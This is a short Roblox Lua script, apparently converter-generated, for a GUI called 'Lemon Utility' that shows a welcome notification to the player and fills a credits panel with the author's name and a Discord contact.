local function BVTHY_script() -- vcCFDfsd.welcome 
	local script = Instance.new('LocalScript', vcCFDfsd)

	local player = game.Players.LocalPlayer
	if script.Parent then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Welcome "..player.Name,
			Text = "Lemon Utility made by @thatamazighi!",
			Duration = 3
		})
	end
	script.Parent.Frame.cred.credi.Text = [[Made by @thatamazighi
	Thank you for using Lemon Utility!
	If any bugs are found, contact @thatoneamazighi on Discord :D]]
end
coroutine.wrap(BVTHY_script)()
